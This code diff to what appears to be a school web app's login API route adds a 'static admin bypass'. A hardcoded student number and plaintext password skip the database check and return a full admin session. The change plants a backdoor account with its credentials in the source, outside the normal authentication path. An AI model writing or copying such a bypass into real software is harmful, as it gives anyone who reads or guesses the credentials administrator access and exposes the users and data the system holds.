@@ -13,6 +13,27 @@ export async function POST(request) {
       );
     }
 
+    // Static admin bypass
+    if (studentNumber.toString().trim() === "02230125") {
+      if (!password || password.trim() !== "lepcha") {
+        return Response.json(
+          { success: false, error: "Invalid password" },
+          { status: 401 }
+        );
+      }
+      return Response.json({
+        success: true,
+        user: {
+          studentNumber: "02230125",
+          name: "Admin",
+          email: "admin@cst.edu.bt",
+          role: "admin",
+          gender: "male",
+          phoneNumber: "",
+        },
+      });
+    }
+
     // Find user by student number
     const user = await prisma.user.findUnique({
       where: { studentNumber: studentNumber.toString() },
